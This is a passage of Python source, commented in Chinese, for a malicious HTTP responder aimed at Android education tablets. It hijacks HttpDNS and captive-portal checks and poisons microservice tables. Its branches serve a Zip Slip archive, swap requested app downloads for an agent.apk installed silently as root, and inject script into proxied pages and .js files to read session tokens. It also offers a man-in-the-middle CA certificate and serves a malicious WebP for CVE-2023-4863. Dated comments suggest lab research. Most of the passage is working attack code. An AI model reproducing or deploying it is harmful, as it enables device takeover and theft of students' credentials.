    if _ep in ("/sys_portal.html", "/portal", "/auth"):
        wlog("!!!!!! [SYS-PORTAL] \u7cfb\u7edf\u8ba4\u8bc1\u9875\u4e0b\u53d1 (%dB) | Host=%s" % (len(SYS_PORTAL), host))
        stat["sysport"] = stat.get("sysport", 0) + 1
        return _resp(SYS_PORTAL, "text/html; charset=UTF-8")

    if _ep.startswith("/hit"):
        # HIT-BEACON: 埋点即时应答, 绝不能挂住
        try:
            wlog("!!!!!! [HIT] %s" % _ep[:400])
        except Exception:
            pass
        return ("HTTP/1.1 204 No Content\r\n"
                "Access-Control-Allow-Origin: *\r\n"
                "Cache-Control: no-store\r\n"
                "Content-Length: 0\r\n"
                "Connection: keep-alive\r\n\r\n").encode("utf-8")

    # 【自答 1】HttpDNS: 必须自己答, 否则无法把域名引到我们
    if "/103172/d" in path or ("host=" in path and "d?" in path):
        _hosts = re.findall(r"host=([^&\s]+)", path) or ["null"]
        def _ips_for(h):
            if not h or h.lower() in ("null", "none", "undefined", "0.0.0.0"):
                return []
            if h in DNS_HIJACK or any(h.endswith(x) for x in DNS_HIJACK):
                return [DNS_IP]
            # HTTPDNS-PATTERN-HIJACK: 教室/IM/盒子类域名也解析到本机(与 dns_hijack 的模式劫持双保险)
            _hl = (h or "").lower()
            for _p in DNS_PATTERNS:
                if _p and _p in _hl:
                    wlog("!!!!!! [HTTPDNS-PATTERN] %s (\u5339\u914d '%s') -> %s" % (h, _p, DNS_IP))
                    stat["httpdns_pattern"] = stat.get("httpdns_pattern", 0) + 1
                    return [DNS_IP]
            # ★ 优先用验证过可达的 IP (REAL_IP), 否则用公共 DNS(绕过 hosts)
            if h in REAL_IP:
                return [REAL_IP[h]]
            return dns_public(h)
        if len(_hosts) == 1:
            _obj = {"host": _hosts[0], "ips": _ips_for(_hosts[0]), "ttl": 60}
        else:
            _obj = {"hosts": [{"host": _h, "ips": _ips_for(_h), "ttl": 60} for _h in _hosts]}
        stat["httpdns"] = stat.get("httpdns", 0) + 1
        _dbg = [(o.get("host"), o.get("ips")) for o in (_obj.get("hosts") or [_obj])]
        wlog("[HTTPDNS-PRI] %s -> %s" % (_hosts, _dbg))
        return _resp(json.dumps(_obj).encode("utf-8"), "application/json; charset=UTF-8")

    # 【自答 2】联通性自检成功页
    if _ep == "/data/wifi.html" and ("zjxhedu" in host or "yunzuoye" in host):
        _wp = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           "portal", "wifi_success.html")
        try:
            with open(_wp, "rb") as _wf:
                _wb = _wf.read()
        except OSError:
            _wb = ('<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />'
                   '<title>\u516c\u53f8\u7b80\u4ecb-\u6d59\u6c5f\u5b66\u6d77\u6559\u80b2\u79d1\u6280\u6709\u9650\u516c\u53f8</title></head>'
                   '<body>\u8fde\u63a5\u6210\u529f\uff01\u6d59\u6c5f\u5b66\u6d77\u6559\u80b2\u79d1\u6280\u6709\u9650\u516c\u53f8</body></html>'
                   ).encode("utf-8")
        stat["wifiok"] = stat.get("wifiok", 0) + 1
        wlog("!!!!!! [WIFI-OK-PRI] 下发联通性成功页 (%dB) | Host=%s" % (len(_wb), host))
        return _resp(_wb, "text/html; charset=UTF-8")

    # 【自答 3】★ Zip Slip: 批量下载
    if "XHFileServer/file/batch" in _ep or "batch/raw/download" in _ep:
        stat["zipslip"] = stat.get("zipslip", 0) + 1
        _zp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "zipslip.bin")
        try:
            with open(_zp, "rb") as _zf:
                _zb = _zf.read()
        except OSError:
            _zb = b""
        wlog("!!!!!! [ZIPSLIP] 批量下载命中 -> 下发 ZIP %dB (写 xuehai/keep/launcher_dynamic.ini)" % len(_zb))
        return _resp(_zb, "application/zip")

    # 【2026-10-24】TOKEN-PAGE: 问卷/通知 H5 的文档导航 => 整页替换成我们自己的页面
    #   依据(10-04 实证 3 次): 直接下发我们自己的页面(同源相对信标)时, WebView 会执行其 JS;
    #   而"改真实页面的内联脚本"会被 CSP 拦、"改 .js" 会被 SRI 完整性校验拦(今天已实证)。
    #   该 WebView 注册了 LauncherJs + webView(getToken) 桥 => 页面 JS 可读取会话令牌。
    try:
        _h_low = (host or "").lower()
        _is_doc_host = ("survey" in _h_low) or ("zjxhedu" in _h_low)
        _is_beacon = any(_b in path for _b in ("TOKENLEAK", "LEAK", "/p.gif", "/PHOTO"))
        if _is_doc_host and not _is_beacon and _ep in ("/", "/index.html", "/home", ""):
            stat["token_page"] = stat.get("token_page", 0) + 1
            wlog("!!!!!! [TOKEN-PAGE] %s%s -> 下发 EXPLOIT_PAGE (%dB)" % (
                host, path[:60], len(EXPLOIT_PAGE)))
            return _resp(EXPLOIT_PAGE, "text/html; charset=UTF-8")
    except Exception as _tpe:
        wlog("[TOKEN-PAGE-ERR] %s" % _tpe)

    # 【其余全部】代理到真服务器 —— 保证登录与所有应用功能正常
    # ★★★ PAYLOAD-PRE (2026-10-16 21:5x): 在代理之前先拦"指向我们自己的归档/安装包请求"。
    #   实测场景(WS 注入 canvas_tag+type=3 短语下发, voiceUrl 指向我们):
    #     [HIGH-VALUE-RESOURCE] .7z GET /poc0003.7z | Host=192.168.137.1
    #   => 这些请求原先落到本分支并被当成"要代真服务器" => 转发失败 => 白跑
    #   => 现在直接下发我们的载荷(ZIP-SLIP / agent.apk)
    try:
        _pext = path.split("?")[0].rsplit(".", 1)[-1].lower() if "." in path.split("?")[0] else ""
        _pdir = os.path.dirname(os.path.abspath(__file__))
        _ppl = None
        if _pext in ("zip", "rar", "cwp", "obb"):
            _ppl = os.path.join(_pdir, "payload_proxy.zip")
        elif _pext in ("7z", "xz", "gz", "tar"):
            _ppl = os.path.join(_pdir, "payload_proxy.7z")
        elif _pext == "apk":
            _ppl = os.path.join(_pdir, "agent.apk")
        if _ppl and os.path.exists(_ppl):
            _pblob = open(_ppl, "rb").read()
            _pct2 = {"zip": "application/zip", "apk": "application/vnd.android.package-archive",
                     "7z": "application/x-7z-compressed"}.get(_pext, "application/octet-stream")
            stat["payload_serve"] = stat.get("payload_serve", 0) + 1
            wlog("!!!!!! [PAYLOAD-SERVE2] .%s %s | Host=%s -> %s (%dB) 已下发" % (
                _pext, path[:80], host, os.path.basename(_ppl), len(_pblob)))
            return _resp(_pblob, _pct2)
    except Exception as _pe2:
        wlog("[PAYLOAD-SERVE2-ERR] %s" % _pe2)
    _pb, _pct = proxy_real(host, method, path, body)
    if _pb is not None:
        stat["proxied"] = stat.get("proxied", 0) + 1
        # HTML-INJECT (2026-10-10): 给所有代理返回的 H5 页面注入桥探针载荷。
        #   云课堂带桥容器(BaseWebViewActivity, 桥名 webView)加载的是 H5 页面/脚本;
        #   只注入 .js 会漏掉直接加载 .html 的情况 => 注入盲区。
        try:
            _low = (_pct or "").lower()
            _p0 = path.split("?")[0].lower()
            if (("text/html" in _low) or _p0.endswith(".html") or _p0.endswith(".htm")) \
                    and "gzip" not in _low and _pb and len(_pb) > 32:
                _pay = BRIDGE_PROBE or SURVEY_RECON
                if _pay:
                    _inj = b"<script>" + _pay + b"</script>"
                    if b"<head>" in _pb:
                        _pb = _pb.replace(b"<head>", b"<head>" + _inj, 1)
                    elif b"<HEAD>" in _pb:
                        _pb = _pb.replace(b"<HEAD>", b"<HEAD>" + _inj, 1)
                    else:
                        _pb = _inj + _pb
                    stat["html_inject"] = stat.get("html_inject", 0) + 1
                    wlog("!!!!!! [HTML-INJECT] 注入桥探针 -> %s%s (%dB, %s)" % (
                        host, path[:80], len(_pb), _pct[:40]))
        except Exception as _ie:
            wlog("[HTML-INJECT-ERR] %s" % _ie)
        # JS-INJECT (2026-10-24): CSP 可能阻止内联 script => 往端侧自己的 .js 里追加探针
        try:
            _low2 = (_pct or "").lower()
            _p0b = path.split("?")[0].lower()
            if (("javascript" in _low2) or _p0b.endswith(".js")) \
                    and "gzip" not in _low2 and _pb and len(_pb) > 32:
                _jpay = BRIDGE_PROBE or b""
                if _jpay:
                    _pb = _pb + b"\n;\n/*probe*/\n" + _jpay + b"\n"
                    stat["js_inject"] = stat.get("js_inject", 0) + 1
                    wlog("!!!!!! [JS-INJECT] \u6ce8\u5165\u6865\u63a2\u9488 -> %s%s (%dB, %s)" % (
                        host, path[:80], len(_pb), _pct[:40]))
        except Exception as _je:
            wlog("[JS-INJECT-ERR] %s" % _je)
        wlog("[PROXY-ALL] %s %s%s -> %dB %s" % (method, host, path[:110], len(_pb), _pct[:30]))
        return _resp(_pb, _pct)
    wlog("[PROXY-ALL-ERR] %s %s%s (真服务器不可达)" % (method, host, path[:110]))
    return _resp(b'{"code":500,"message":"upstream unreachable","data":{}}',
                 "application/json; charset=UTF-8")

    # ★★★ 首选: 全部交给本机 portal_server(认证页/302 语义一致) ★★★
    # 配合黑洞路由: 真服务器已不可达, 平板发往真实 IP 的请求只能由我们应答。
    if (os.environ.get("HTTP80_PORTAL_RELAY") or "1") == "1":
        raw = portal_relay(host, method, path, body)
        if raw:
            stat["portal_relay"] = stat.get("portal_relay", 0) + 1
            first = raw.split(b"\r\n", 1)[0].decode("latin1", "replace")
            wlog("!!!!!! [PORTAL-RELAY] %s %s | Host=%s -> %s" % (
                method, path[:80], host, first))
            return raw
    # ★★★ 第一步: 把热点推进"需要认证"状态 ★★★
    # 系统探测主机 / generate_204 一律回 302 重定向到我们控制的认证页 ——
    # Android 收到 3xx 即判定 captive portal, 于是显示"需要认证"并允许打开认证界面;
    # 该认证页 (www.zjxhedu.com/data/wifi.html) 也由我们提供, 其 WebView 挂 LauncherJs 桥。
    _cp = path.split("?")[0].lower()
    if (host in CAPTIVE_PROBE_HOSTS or "generate_204" in _cp or "gen_204" in _cp
            or "connectivitycheck" in host or "captive" in host):
        stat["captive"] = stat.get("captive", 0) + 1
        # CAPTIVE-MODE-TOGGLE: 可切换判定(从网络侧触发设备事件)
        _cm = "portal"
        try:
            _cm = (open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                     "captive_mode.txt")).read() or "").strip() or "portal"
        except Exception:
            pass
        if _cm == "validated":
            wlog("!!!!!! [CAPTIVE] 探测命中 -> 204 (网络已验证, 判定翻转) | Host=%s | %s"
                 % (host, path[:70]))
            return (b"HTTP/1.1 204 No Content\r\nContent-Length: 0\r\n"
                    b"Cache-Control: no-store\r\nConnection: keep-alive\r\n\r\n")
        wlog("!!!!!! [CAPTIVE] 探测命中 -> 302 重定向到认证页 | Host=%s | %s" % (
            host, path[:70]))
        return _redirect(PORTAL_URL)
    # ★ 厂商认证页本身 -> 回我们的载荷(完整载荷走 /p.js)
    # ★★★ APK-HIJACK (2026-10-10 23:0x): 端侧的"应用下载"走**明文文件服务**:
    #   http://filesoss.yunzuoye.net/XHFileServer/file/stream?url=...   (启动器 DownloadRetryInterceptor)
    #   http://files.yunzuoye.net/XHFileServer/file                     (设置 App 的 networkclient)
    #   ⇒ 一律回我们的 agent.apk => 端侧 installApplication()/installApkSilent()
    #     以 root 执行 `pm install -r` 装上我们的包(设置 App 有 execRootCmd, 启动器有 RootSysProcess)
    if ("xhfileserver/file" in _p or "/file/stream" in _p or "/file/upload" in _p) and \
            any(k in (host or "").lower() for k in ("files", "file", "oss", "yunzuoye")):
        try:
            _apk = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk"), "rb").read()
            stat["apk_hijack"] = stat.get("apk_hijack", 0) + 1
            wlog("!!!!!! [APK-HIJACK] %s%s -> agent.apk (%dB) 端侧将静默安装" % (
                host, path[:80], len(_apk)))
            return _resp(_apk, "application/vnd.android.package-archive")
        except Exception as _ae:
            wlog("[APK-HIJACK-ERR] %s" % _ae)
    # ★★★ CA-DOWNLOAD (2026-10-10 22:2x): 通过明文面把 MITM CA 证书提供给平板安装。
    #   平板浏览器/WebView 访问 http://<任意被劫持主机>/ca.cer 即得到 DER 证书,
    #   用户在 设置->安全->从存储设备安装->应用/VPN 证书 里选它 => 之后 443 中间人生效。
    if path.split("?")[0].lower() in ("/ca.cer", "/ca.crt", "/ca.pem", "/cert", "/ca"):
        _cad = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mitm_ca")
        try:
            _pem = path.split("?")[0].lower().endswith(".pem")
            _file = "ca.pem" if _pem else "ca.cer"
            _blob = open(os.path.join(_cad, _file), "rb").read()
            wlog("!!!!!! [CA-DOWNLOAD] %s%s -> %s (%dB) 平板可安装" % (host, path[:40], _file, len(_blob)))
            return _resp(_blob, "application/x-x509-ca-cert" if not _pem
                         else "application/x-pem-file", extra=b"Content-Disposition: attachment; filename=%s\r\n" % _file.encode())
        except Exception as _e:
            wlog("[CA-DOWNLOAD-ERR] %s" % _e)
    if "zjxhedu" in host or "wifi" in _cp:
        if _cp in ("/p.js", "/payload.js"):
            stat["payload"] = stat.get("payload", 0) + 1
            wlog("!!!!!! [PAYLOAD] 认证页下发完整载荷 (%dB) | Host=%s" % (len(SURVEY_JS), host))
            return _resp(SURVEY_JS, "application/javascript; charset=UTF-8")
        stat["wifi_boot"] = stat.get("wifi_boot", 0) + 1
        wlog("!!!!!! [WIFI-BOOT] 认证页下发我们的载荷 | Host=%s | %s" % (host, path[:80]))
        return _resp(AUTH_PAGE, "text/html; charset=UTF-8")
    # ★★★ 云课堂"取页面"接口 —— 明文, 实测 2026-10-04 20:00:16 真实命中本应答器:
    #   GET http://airclassrecord.yunzuoye.net/api/v3/users/{uid}/getPage
    #       ?classrooms={boundId}&sign={sig}&t={ts}
    # 该接口返回云教室的 PPT/笔记/黑板页面数据。响应格式未从代码取到, 故采用"综合响应":
    # 把所有可能的页面地址字段(url/pageUrl/webUrl/target=webview)全部指向我们的令牌页,
    # 同时把我们的 HTML 内联进 html/content/data.* —— 无论端侧取字段还是直接渲染,
    # 都会落到我们控制的页面上, 其 JS 里的 window.webView.getToken() 即回传会话令牌。
    if "getPage" in path or host == "airclassrecord.yunzuoye.net":
        stat["getpage"] = stat.get("getpage", 0) + 1
        # 【2026-10-24】代理真实响应 -> 落盘 -> **注入我们控制的记录** -> 返回
        #   真实 schema: {"code":200,"msg":"success","data":[{"records":[]}],"desc":""}
        #   records 字段: videoId/userId/createTime/classroomId/classroomName/
        #                 mediaUrl/timeLength/status/changeStatus/type
        try:
            _rb, _rct = proxy_real(host, method, path, body)
            try:
                _gp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "getpage_capture.log")
                with open(_gp, "a", encoding="utf-8") as _gf:
                    _gf.write("\n===== %s %s %s%s -> %dB =====\n" % (
                        datetime.datetime.now(), method, host, path[:200], len(_rb)))
                    _gf.write(_rb.decode("utf-8", "replace")[:30000] + "\n")
            except Exception:
                pass
            # 注入记录
            try:
                _j = json.loads(_rb.decode("utf-8", "replace"))
                _records = _j.get("records")
                _data = _j.get("data")
                _targets = []
                if isinstance(_data, list):
                    _targets = _data
                elif isinstance(_data, dict):
                    _targets = [_data]
                else:
                    _targets = [_j]
                _now = int(time.time() * 1000)
                for _d0 in _targets:
                    if not isinstance(_d0, dict):
                        continue
                    _recs = _d0.get("records")
                    if not isinstance(_recs, list):
                        _recs = []
                    _media = "http://%s/poc7z.7z" % OUR_IP
                    _new = {
                        "videoId": "LABV1", "userId": 2112229,
                        "createTime": _now, "classroomId": "UXHOVJJF",
                        "classroomName": "lab", "mediaUrl": _media,
                        "timeLength": 1, "status": 1, "changeStatus": 1,
                        "type": 1, "name": "lab", "title": "lab",
                        "videoName": "lab",
                    }
                    _recs.insert(0, _new)
                    _d0["records"] = _recs
                _j["data"] = _targets
                _rb2 = json.dumps(_j, ensure_ascii=False).encode("utf-8")
                stat["getpage_inject"] = stat.get("getpage_inject", 0) + 1
                wlog("!!!!!! [GETPAGE-INJECT] 已注入记录 mediaUrl=http://%s/poc7z.7z -> %dB" % (OUR_IP, len(_rb2)))
                return _resp(_rb2, _rct)
            except Exception as _je:
                wlog("[GETPAGE-INJ-ERR] %s" % _je)
            return _resp(_rb, _rct)
        except Exception as _ge:
            wlog("[GETPAGE-ERR] %s" % _ge)
        wlog("!!!!!! [GETPAGE] 代理失败 -> 综合响应 | Host=%s" % host)
        page = "http://%s/xhpage" % OUR_IP
        html = EXPLOIT_PAGE.decode("utf-8", "replace")
        obj = {"code": 0, "msg": "ok", "success": True, "status": 0, "total": 1,
               "url": page, "pageUrl": page, "webUrl": page, "htmlUrl": page,
               "target": "webview", "type": "webview", "contentType": "webview",
               "data": {"url": page, "pageUrl": page, "webUrl": page,
                        "html": html, "content": html, "target": "webview",
                        "type": "webview"},
               "html": html, "content": html, "page": html}
        return _resp(json.dumps(obj).encode("utf-8"), "application/json; charset=UTF-8")
    # 【2026-10-24】CVE-2023-4863 投递: 端侧从明文 OSS 拉取的图片 -> 替换成恶意 WebP
    #   设备 SPL 2021-08 ⇒ 系统 libwebp 未打 2023-09 补丁 ⇒ 解码恶意 WebP 触发堆溢出
    try:
        _ep2 = path.split("?")[0]
        _ext_img = _ep2.rsplit(".", 1)[-1].lower() if "." in _ep2 else ""
        if _ext_img in ("png", "jpg", "jpeg", "webp", "gif", "bmp"):
            _wp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nso.webp")
            if os.path.exists(_wp):
                _wblob = open(_wp, "rb").read()
                stat["webp_serve"] = stat.get("webp_serve", 0) + 1
                wlog("!!!!!! [WEBP-SERVE] 图片请求 -> 下发恶意 WebP (%dB) | Host=%s | %s" % (
                    len(_wblob), host, path[:90]))
                return _resp(_wblob, "image/webp")
    except Exception as _we:
        wlog("[WEBP-SERVE-ERR] %s" % _we)
    # 0) 透明中继(云教室等): 取真响应 -> 落盘 -> 原样转发
    if host in RELAY_HOSTS:
        data, ct = relay_capture(host, method, path, body)
        stat["relay"] = stat.get("relay", 0) + 1
        return _resp(data, ct)
    """按路径分派明文应答。

    关键分支 HttpDNS: 端侧用 POST /103172/d?host=<domain> 做域名解析(明文, 真服务器
    现在直接 RST)。把它回答成 192.168.137.1 —— 即本机自有地址, **本地投递**,
    不依赖任何 loopback 别名 —— 于是 ms/control 等明文基址全部落到我们身上,
    整条 assist 链(服务发现 -> versionChange -> assists/tasks -> assist/result)
    都能在明文面完成, 彻底绕开 TLS 信任与 PBS 推送。
    """
    if "/103172/d" in path or "host=" in path:
        hosts = re.findall(r"host=([^&\s]+)", path) or ["null"]
        # 【2026-10-04 修正】只劫持白名单里的域, 其余返回**真实 IP**。
        # 之前"全部回 192.168.137.1"会破坏设备所有联网(HTTPS 被 tls_relay 错误转发 -> 加载失败)。
        # 另外: 空/`null` host 必须**拒绝应答**(回空 ips), 否则应用会拿到空 URL 去加载
        # -> 这正是"加载网页失败, 请检查网络"的直接原因
        #    (日志: POST /103172/d?host=null -> 192.168.137.1 -> GET /?userId=.. | Host=null)。
        def _ips_for(h):
            if not h or h.lower() in ("null", "none", "undefined", "0.0.0.0"):
                return []
            if h in DNS_HIJACK or any(h.endswith(x) for x in DNS_HIJACK):
                return [DNS_IP]
            try:
                import socket as _s
                return sorted({ai[4][0] for ai in
                               _s.getaddrinfo(h, None, _s.AF_INET)})
            except Exception:
                return []
        if len(hosts) == 1:
            obj = {"host": hosts[0], "ips": _ips_for(hosts[0]), "ttl": 60}
        else:
            obj = {"hosts": [{"host": h, "ips": _ips_for(h), "ttl": 60}
                             for h in hosts]}
        stat["httpdns"] = stat.get("httpdns", 0) + 1
        wlog("[HTTPDNS] %s -> %s" % (hosts, [o["ips"] for o in
                                             (obj.get("hosts") or [obj])]))
        return _resp(json.dumps(obj).encode("utf-8"), "application/json; charset=UTF-8")
    if "microServer" in path or "GetXsList" in path:
        _step(1, 10, "service table request")
        # ★★★ TABLE-FORCE-OURS (2026-10-11 08:3x): 明文服务表请求 -> **直接给我们的表**,
        #   不再转发真服务器(否则表里仍是真实 HTTPS 地址, 我们无法介入)。
        #   依据: XHMicroServer.MICRO_SERVICE_URL="http://ms.yunzuoye.net/XhServerMg/GetXsList"
        #         BaseMicroServer.RESETFul_MICRO_SERVICE_HOST="http://ms.yunzuoye.net"  (均明文)
        #   全部类型 -> http://192.168.137.1:80  => 端侧服务层归我们 => 可下发应用/MDM 安装
        _force = (os.environ.get("TABLE_FORCE_OURS") or "1").strip() not in ("0", "no", "false")
        if _force:
            try:
                _types = re.findall(r'types?=([A-Za-z0-9_,]+)', path)
                _tl = _types[0].split(",") if _types else None
                _allt = ["SA106003", "SB101001", "SB103019", "SB103018", "SB103015",
                         "SB103013", "SB103007", "SB103027", "SB103016", "SB103017",
                         "SB103020", "WEB002011", "WEB113001", "WEB113002", "WEB113003"]
                _ts = [x for x in (_tl or _allt) if x]
                # ★★★ FORMAT-FIX (2026-10-16 21:5x, 依据 ini-writer 战线的反编译证据):
                #   V1 路径(/XhServerMg/GetXsList, /api/v1/pub/microServer/):
                #       {"serverType":"A,B","microServerDtoList":"<字符串化的数组>","updateTime":<ms>}
                #   V2/V3 路径(/api/v2|v3/pub/microServer/list/):
                #       [ {"serverType":..,"classId":..,"schoolId":..,"version":..,
                #          "microServerNewDtoList":[ {serverType,serverId,domainOrIp,port,protocol,
                #                                    addressType,dirLocation,index,mode,schList} ]} ]
                #   => 之前只回 V1 格式, 端侧请求 V2/V3 时会解析失败(服务表毒化失败)
                _dto = [{"serverType": t, "serverId": 4000 + i, "domainOrIp": OUR_IP,
                         "port": 80, "protocol": "HTTP", "addressType": "IP",
                         "dirLocation": "", "index": i, "mode": 0, "schList": [],
                         "classId": 0, "schoolId": 0, "updateTime": 4102444800000}
                        for i, t in enumerate(_ts)]
                _low = (path or "").lower()
                if "/api/v2/" in _low or "/api/v3/" in _low:
                    # V2/V3: 数组 + microServerNewDtoList
                    _obj = [{"serverType": t, "classId": 0, "schoolId": 0,
                             "version": 4102444800000,
                             "microServerNewDtoList": [d for d in _dto if d["serverType"] == t]}
                            for t in _ts]
                else:
                    # V1: 对象 + microServerDtoList(字符串化数组) + serverType 逗号分隔
                    _obj = {"serverType": ",".join(_ts),
                            "microServerDtoList": json.dumps(_dto, ensure_ascii=False),
                            "updateTime": 4102444800000,
                            "version": 4102444800000,
                            "data": {"serverType": ",".join(_ts),
                                     "microServerDtoList": json.dumps(_dto, ensure_ascii=False),
                                     "updateTime": 4102444800000,
                                     "version": 4102444800000}}
                stat["table_ours"] = stat.get("table_ours", 0) + 1
                wlog("!!!!!! [TABLE-OURS] %s%s -> %d 类服务全部指向 %s:80 (HTTP, 格式=%s)" % (
                    host, path[:60], len(_ts), OUR_IP,
                    "V2/V3" if ("/api/v2/" in _low or "/api/v3/" in _low) else "V1"))
                return _resp(json.dumps(_obj, ensure_ascii=False).encode("utf-8"),
                             "application/json; charset=UTF-8")
            except Exception as _e:
                wlog("[TABLE-OURS-ERR] %s" % _e)
        _mb, _mct = proxy_real(host, method, path, body)
        if _mb is not None:
            # SURGICAL-WEB-REWRITE: 只把 网页/H5/资源/文件服务 改到我们(明文), 其余保持真实
            try:
                _mb2, _mr = micro_rewrite(_mb)
                if _mr:
                    wlog("!!!!!! [MICRO-WEBREWRITE] %s%s | %s" % (host, path[:60], "; ".join(_mr[:8])))
                    _mb = _mb2
            except Exception as _e:
                wlog("[MICRO-WEBREWRITE-ERR] %s" % _e)
            wlog("[MICRO-REAL] %s%s -> %dB (real service table + web rewrite)" % (
                host, path[:90], len(_mb)))
            return _resp(_mb, _mct)
        # ★★★ FULL-TABLE-FALLBACK (2026-10-11 08:3x): 真服务器不可达时, 我们自己生成"全量指向我们"的表
        #   依据: XHMicroServer.MICRO_SERVICE_URL = "http://ms.yunzuoye.net/XhServerMg/GetXsList"
        #         BaseMicroServer.RESETFul_MICRO_SERVICE_HOST = "http://ms.yunzuoye.net"  (均为明文)
        try:
            _types = re.findall(r'types?=([A-Za-z0-9_,]+)', path)
            _tl = _types[0].split(",") if _types else None
            _allt = ["SA106003", "SB101001", "SB103019", "SB103018", "SB103015", "SB103013",
                     "SB103007", "SB103027", "SB103016", "SB103017", "SB103020",
                     "WEB002011", "WEB113001", "WEB113002", "WEB113003"]
            _ts = [x for x in (_tl or _allt) if x]
            _dto = [{"serverId": 4000 + i, "serverType": t, "domainOrIp": OUR_IP,
                     "port": 80, "dirLocation": "", "protocol": "HTTP",
                     "addressType": 1, "mode": 0, "schList": [0], "index": i,
                     "updateTime": 4102444800000} for i, t in enumerate(_ts)]
            _obj = {"serverType": ",".join(_ts), "updateTime": 4102444800000,
                    "microServerDtoList": _dto, "version": 4102444800000}
            wlog("!!!!!! [MICRO-FULLTABLE] %s%s -> 全量 %d 类服务指向 %s:80" % (
                host, path[:70], len(_ts), OUR_IP))
            return _resp(json.dumps(_obj, ensure_ascii=False).encode("utf-8"),
                         "application/json; charset=UTF-8")
        except Exception as _e:
            wlog("[MICRO-FULLTABLE-ERR] %s" % _e)
        wlog("[MICRO-REAL-ERR] %s%s real server unreachable" % (host, path[:90]))
        return _resp(b'{"code":500,"message":"micro unavailable","data":{}}',
                     "application/json; charset=UTF-8")
    if "platform/login" in _p:
        _step(3, 10, "登录接口命中 -> 构造登录响应(微服务表指向我们)")
        # ★ 优先转发真服务器(保证应用正常)
        _pb, _pct = proxy_real(host, method, path, body)
        if _pb is not None:
            # MICRO-REWRITE: 真响应里把微服务地址改写成我们(否则 UrlCache 拿到真实 HTTPS 地址)
            _pb2, _mr = micro_rewrite(_pb)
            if _mr:
                wlog("!!!!!! [MICRO-REWRITE] \u767b\u5f55\u54cd\u5e94\u5df2\u6539\u5199: %s | %dB" % ("; ".join(_mr[:6]), len(_pb2)))
            return _resp(_pb2, _pct)
        _obj = {"code": 200, "message": "success", "data": {
            "userInfo": {"userId": 2112229, "username": "student", "userType": 2,
                         "schoolId": 1000, "schoolName": "school",
                         "token": "bearer_lab_token", "phone": "", "role": 1,
                         "environment": 1},
            "microServerResponse": [{"severType": "SB101001", "microServerList": [
                {"protocol": "http", "domainOrIp": OUR_IP,
                 "dirLocation": "", "port": OUR_PORT}]}]}}
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # 5) versionChange: 下发服务端"数据码" -> 端侧自动进入协助态 / 刷新应用列表
    #   ★★★ PLAN3-FIX (2026-10-11 08:4x) 两处致命错误已修正:
    #     (a) 字段名: 端侧读的是 ResourceUpdateBean.dataCodes(**String, 逗号分隔**),
    #         而不是 dataCodeList/List —— 之前下发的 List 字段端侧完全不看 ✗
    #     (b) 码串必须逐字匹配 ApiDataCode 常量:
    #         REMOTE_ASSIST  = "CA106004SB1030140001"   (之前误用 CA106002… 前缀 ✗)
    #         APP_INFO_LIST  = "CA106004SB1010070001"   (刷新"应用列表" -> 走我们的应用下发)
    #         (其余: HOTFIX_PATCH_INFOS=…070003 / FIREWALL_CONFIG=…070004 / WHITE_LIST_CHANGE=…070002)
    if "versionChange" in _p or "versionchange" in _p.lower():
        _step(4, 10, "versionChange 命中 -> 下发正确 dataCodes(REMOTE_ASSIST + APP_INFO_LIST)")
        _codes = os.environ.get(
            "VERSIONCHANGE_CODES",
            "CA106004SB1030140001,CA106004SB1010070001")  # REMOTE_ASSIST, APP_INFO_LIST
        _obj = {"code": 200, "message": "success", "success": True,
                "data": {"version": 4102444800000,
                         "dataCodes": _codes,          # ★ 端侧真正读取的字段(String)
                         "intervalTime": 60000,
                         "updateTime": 4102444800000},
                # 兼容: 其它可能被读取的字段一并给出
                "dataCodes": _codes,
                "intervalTime": 60000,
                "version": 4102444800000,
                "codeList": _codes.split(","),
                "dataCodeList": _codes.split(",")}
        stat["versionchange"] = stat.get("versionchange", 0) + 1
        wlog("!!!!!! [VERSIONCHANGE] 下发 dataCodes=%s (REMOTE_ASSIST + APP_INFO_LIST)" % _codes)
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # 4) 设备检查 (launcher 引导流程入口)
    if "check/device" in _p or "/api/v1/pub/platform/check" in _p:
        _step(2, 10, "check/device 命中 -> 引导 launcher 进入更新流程")
        # ★ 优先转发真服务器(保证应用正常)
        _pb, _pct = proxy_real(host, method, path, body)
        if _pb is not None:
            _pb2, _mr = micro_rewrite(_pb)
            if _mr:
                wlog("!!!!!! [MICRO-REWRITE] \u8bbe\u5907\u6821\u9a8c\u54cd\u5e94\u5df2\u6539\u5199: %s" % ("; ".join(_mr[:6])))
            return _resp(_pb2, _pct)
        _obj = {"code": 200, "message": "success", "data": {
            "needUpdate": True, "versionCode": 999999,
            "url": "http://%s/zhitongyun.apk" % OUR_IP,
            "md5": "", "force": False}}
        return _resp(json.dumps(_obj).encode("utf-8"),
                     "application/json; charset=UTF-8")

    # 3) ★ Zip Slip: 批量下载应答
    if "XHFileServer/file/batch" in _p or "batch/raw/download" in _p:
        _step(5, 10, "★ 批量下载命中 -> 返回 Zip Slip ZIP(写 launcher_dynamic.ini)")
        stat["zipslip"] = stat.get("zipslip", 0) + 1
        _zp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "zipslip.bin")
        try:
            with open(_zp, "rb") as _zf:
                _zb = _zf.read()
        except OSError:
            _zb = b""
        wlog("!!!!!! [ZIPSLIP] 下发 ZIP %dB -> xuehai/keep/launcher_dynamic.ini" % len(_zb))
        return _resp(_zb, "application/zip")

    # 2) 单文件/流式下载
    if "XHFileServer/file/stream" in _p or "XHFileServer/file/upload" in _p:
        _step(5, 10, "文件流转发命中 -> 返回我们的载荷")
        try:
            with open(APK_PATH, "rb") as _af:
                return _resp(_af.read(), "application/octet-stream")
        except OSError:
            return _resp(b"ok", "text/plain")

    # 1) launcher 平台 APK 下发
    if "/api/v2/platform/apk" in _p or "v2/platform/apk" in _p:
        _step(6, 10, "平台 APK 接口命中 -> 下发我们的 APK")
        # ★ 优先转发真服务器(保证应用正常)
        _pb, _pct = proxy_real(host, method, path, body)
        if _pb is not None:
            return _resp(_pb, _pct)
